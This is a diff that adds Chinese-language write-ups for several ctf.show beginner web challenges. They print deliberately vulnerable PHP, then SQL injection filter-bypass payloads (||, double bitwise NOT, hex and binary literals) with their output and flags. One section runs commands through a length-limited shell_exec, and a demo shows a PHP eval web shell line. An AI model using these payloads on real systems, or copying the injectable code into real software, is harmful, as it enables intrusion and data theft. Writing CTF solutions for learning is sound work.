@@ -4888,6 +4888,507 @@ ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282} from flask import request cmd: str
 
 ------
 
+### 萌新杯web1
+
+> 代码很安全，没有漏洞。
+
+PHP代码审计。
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+    $id = $_GET['id'];
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+当`GET`请求传递参数`id`大于999时，靶机返回错误。而`id`小于999时，会拼接`SQL`语句并显示执行结果。
+
+`GET`请求传递参数`/?id=1`时，靶机的显示内容如下：
+
+```
+执行的sql为：select * from article where id = 1 order by id limit 1
+id: 1 - title: this is title
+this is content
+```
+
+而输入`/?id=2`时，靶机的显示内容中并没有`SQL`语句的执行结果，说明并不存在`id=2`的内容。
+
+```sql
+执行的sql为：select * from article where id = 2 order by id limit 1
+```
+
+靶机的注释提示`flag`在`id=1000`，输入`/?id=2%20or%20id=1000`时，靶机能绕过过滤条件并显示`id=1000`的`SQL`执行结果。
+
+```
+执行的sql为：select * from article where id = 2 or id=1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{e3effa1b-14de-40d2-a153-7edbaf5d76dc}
+```
+
+提交`ctfshow{e3effa1b-14de-40d2-a153-7edbaf5d76dc}`即可。
+
+------
+
+### 萌新杯web2
+
+> 管理员赶紧修补了漏洞，这下应该没问题了吧？
+
+靶机给出的源码如下：
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+        $id = $_GET['id'];
+    if(preg_match("/or|\+/i",$id)){
+            die("id error");
+    }
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+哦嚯，这道题是在萌新杯web1的基础上进行加固，过滤了`or`和`+`。
+
+然而，我们还是可以使用`||`来绕过`preg_match("/or|\+/i",$id)`。
+
+`GET`请求传递参数`/?id=2||id=1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = 2||id=1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+```
+
+此外，还有一些`Payload`也可以在靶机中获取`flag`, 但这些`Payload`只适用于PHP7.0以前的部分版本。
+
+- 减号：`/?id=999- -1`，减负数得到1000
+
+  ```
+  执行的sql为：select * from article where id = 999--1 order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+
+- 除号：`/?id=500/(1/2)`
+
+  ```
+  执行的sql为：select * from article where id = 500/(1/2) order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+
+- 乘号：`/?id=250*4`
+
+  ```
+  执行的sql为：select * from article where id = 250*4 order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+
+- 左移运算符：`/?id=500<<1`，左移一位表示乘二；`/?id=250<<2`，左移两位就是乘四。
+
+  ```
+  执行的sql为：select * from article where id = 250<<2 order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+
+- 十六进制数：`/?id=0x3e8`，`intval()`函数默认使用十进制，传入十六进制数时得到的值是0，而在SQL语句中可以正常传入十六进制的`1000`。
+
+  ```
+  执行的sql为：select * from article where id = 0x3e8 order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+
+- 二进制数：`/?id=0b1111101000`，`intval()`函数默认使用十进制，传入二进制数时得到的值是0，而在SQL语句中可以正常处理二进制值的`1000`。
+
+  ```
+  执行的sql为：select * from article where id = 0b1111101000 order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+  
+- 两次取反 ~~1000
+
+  ```
+  执行的sql为：select * from article where id = ~~1000 order by id limit 1
+  id: 1000 - title: CTFshowflag
+  ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}
+  ```
+
+提交`ctfshow{197cc612-2794-4e40-8684-702c9e8ff9ae}`即可。
+
+------
+
+### 萌新杯web3
+
+> 管理员被狠狠的教育了，所以决定好好修复一番。这次没问题了。
+
+靶机给出的源码如下：
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+        $id = $_GET['id'];
+    if(preg_match("/or|\-|\\|\*|\<|\>|\!|x|hex|\+/i",$id)){
+            die("id error");
+    }
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+哦嚯，这道题又进行了加固，过滤了`or`，`-`，`/`，`*`，`<`，`>`，`!`，`x`，`hex`，`+`。
+
+然而，我们还是可以使用`||`来绕过。
+
+`GET`请求传递参数`/?id=2||id=1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = 2||id=1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{083d45d8-ccd2-4d68-9f08-4c6a4d05d80a}
+```
+
+此外，两次取反依旧可以绕过。`GET`请求传递参数`/?id=~~1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = ~~1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{083d45d8-ccd2-4d68-9f08-4c6a4d05d80a}
+```
+
+提交`ctfshow{083d45d8-ccd2-4d68-9f08-4c6a4d05d80a}`即可。
+
+------
+
+### 萌新杯web4
+
+> 管理员阿呆又失败了，这次一定要堵住漏洞。
+
+靶机给出的源码如下：
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+        $id = $_GET['id'];
+    if(preg_match("/or|\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i",$id)){
+            die("id error");
+    }
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+哦嚯，这道题又加固了，过滤了`or`，`-`，`\`，`/`，`*`，`<`，`>`，`!`，`x`，`hex`，`+`，`(`，`)`，`select`。
+
+然而，我们还是可以使用`||`来绕过。
+
+`GET`请求传递参数`/?id=2||id=1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = 2||id=1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{8835745f-d58a-4610-9214-2081d5604714}
+```
+
+此外，两次取反依旧可以绕过。`GET`请求传递参数`/?id=~~1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = ~~1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{8835745f-d58a-4610-9214-2081d5604714}
+```
+
+提交`ctfshow{8835745f-d58a-4610-9214-2081d5604714}`即可。
+
+------
+
+### 萌新杯web5
+
+> 阿呆被老板狂骂一通，决定改掉自己大意的毛病，痛下杀手，修补漏洞。
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+        $id = $_GET['id'];
+    if(preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i",$id)){
+            die("id error");
+    }
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+哦嚯，这道题又加固了，过滤了`or`，`-`，`\`，`/`，`*`，`<`，`>`，`!`，`x`，`hex`，`+`，`(`，`)`，`|`，`'`，`"`，`select`。
+
+然而，我们还是可以两次取反绕过。`GET`请求传递参数`/?id=~~1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = ~~1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{ba1c411d-91b4-409c-8336-a8240d57350b}
+```
+
+提交`ctfshow{ba1c411d-91b4-409c-8336-a8240d57350b}`即可。
+
+------
+
+### 萌新杯web6
+
+> 阿呆一口老血差点噎死自己，决定杠上了。
+
+靶机给出的源码如下：
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+        $id = $_GET['id'];
+    if(preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\^|\!|x|hex|\(|\)|\+|select/i",$id)){
+            die("id error");
+    }
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+挺没意思的，一招鲜吃遍天？！阿呆咋还不过滤`~`，或者升级PHP版本也行啊。
+
+我们依然可以两次取反绕过。`GET`请求传递参数`/?id=~~1000`时，靶机显示的内容如下：
+
+```
+执行的sql为：select * from article where id = ~~1000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{c76fbb3a-d1d9-46bb-bd19-c943394371ab}
+```
+
+此外，二进制数值`0b1111101000`也可以绕过，因为`intval($id)`会将其取值为0，而`SQL`语句则将其视为十进制数值1000，具体分析过程请看下题分晓（滑稽.jpg）。
+
+构造`GET`请求`/?id=0b1111101000`，靶机显示内容如下：
+
+```
+执行的sql为：select * from article where id = 0b1111101000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{c76fbb3a-d1d9-46bb-bd19-c943394371ab}
+```
+
+提交`ctfshow{c76fbb3a-d1d9-46bb-bd19-c943394371ab}`即可。
+
+------
+
 ### 萌新杯web7
 
 > 阿呆得到最高指示，如果还出问题，就卷铺盖滚蛋，阿呆心在流血。
@@ -4940,9 +5441,9 @@ if(isset($_GET['id'])){
 </html>
 ```
 
-首先PHP代码审计。
+在这里来写个详细点的PHP代码审计吧。
 
-过滤规则把很多SQL注入常用的关键字给过滤掉了（如 `'`, `"`, `or`, `select`, `+`, `(`, `)` 等），但是没有过滤空格、数字、字母（除x和hex外）和点、进制前缀等。
+过滤规则把很多SQL注入常用的关键字给过滤掉了（如`or`，`-`，`\`，`/`，`*`，`<`，`>`，`!`，`x`，`hex`，`+`，`(`，`)`，`|`，`'`，`"`，`select`，`~`等），但是没有过滤空格、数字、除`x`外的字母、点、进制前缀等。
 
 ```php
 if(preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\^|\!|\~|x|hex|\(|\)|\+|select/i",$id)){
@@ -5154,6 +5655,97 @@ $flag = "ctfshow{cba00859-d2ff-404d-a9bb-7e6510444a28}";
 ```
 
 提交`ctfshow{cba00859-d2ff-404d-a9bb-7e6510444a28}`即可。
+
+------
+
+### 获得百分之百的快乐
+
+> 阿呆开发了自己的博客系统，准备对欺负他的大佬口吐芬芳
+
+PHP代码审计，靶机的源码如下：
+
+```php+HTML
+<?php
+show_source(__FILE__);
+error_reporting(0);
+if(strlen($_GET[1])<4){
+     echo shell_exec($_GET[1]);
+}
+else{
+     echo "hack!!!";
+}
+?>
+//by Firebasky
+```
+
+只要`GET`传递给参数`1`的字符串长度小于4，就能调用`shell_exec()`执行该字符串。
+
+先用`ls`查看当前目录，`/?1=ls`的回显内容如下：
+
+> secretsecret_ctfshow_36dddddddddd.php zzz.php //by Firebasky
+
+怎么读取`secretsecret_ctfshow_36dddddddddd.php`的内容呢？
+
+在`Linux`系统中，我们可以使用`nl *`来显示当前路径中所有文件的内容。
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tmp]
+└─$ ls
+flag.txt  shell.php
+                                                                   
+┌──(t0ur1st㉿kali)-[~/tmp]
+└─$ nl *
+     1  flag{t0ur1st}
+     2  <?php @eval($_POST('shell'));?>
+```
+
+然而，`nl *`的字符串长度是4，传参`/?1=nl%20*`靶机会显示`hack!!!`。
+
+我们先传参`/?1=>nl`，创建一个名为`nl`的空文件。
+
+此时用`ls`查看当前目录，`/?1=ls`的回显内容如下：
+
+> nl secretsecret_ctfshow_36dddddddddd.php zzz.php //by Firebasky
+
+在`Linux`中发送`*`请求，会将当前路径的第一个文件名`nl`作为命令执行，进而显示文件内容。
+
+```bash
+┌──(t0ur1st㉿kali)-[~/tmp]
+└─$ >nl
+^C
+                                                                   
+┌──(t0ur1st㉿kali)-[~/tmp]
+└─$ *
+     1  flag{t0ur1st}
+     2  <?php @eval($_POST('shell'));?>
+```
+
+`GET`请求传参`/?1=*`，靶机的显示内容如下：
+
+> 1 4 14 //by Firebasky //by Firebasky
+
+其中，1和4分别是`secretsecret_ctfshow_36dddddddddd.php`和`zzz.php`显示内容的起始行。
+
+右键查看网页源代码可以发现以下关键内容：
+
+```
+ 1	<?php
+ 2	$flag = 'ctfshow{4c0099c5-dbf5-46b0-9aa4-72884c07f5a5}';
+ 3	?>
+ 4	<?php
+ 5	show_source(__FILE__);
+ 6	error_reporting(0);
+ 7	if(strlen($_GET[1])<4){
+ 8	     echo shell_exec($_GET[1]);
+ 9	}
+10	else{
+11	     echo "hack!!!";
+12	}
+13	?>
+14	//by Firebasky
+```
+
+提交`ctfshow{4c0099c5-dbf5-46b0-9aa4-72884c07f5a5}`即可。
 
 ------
 
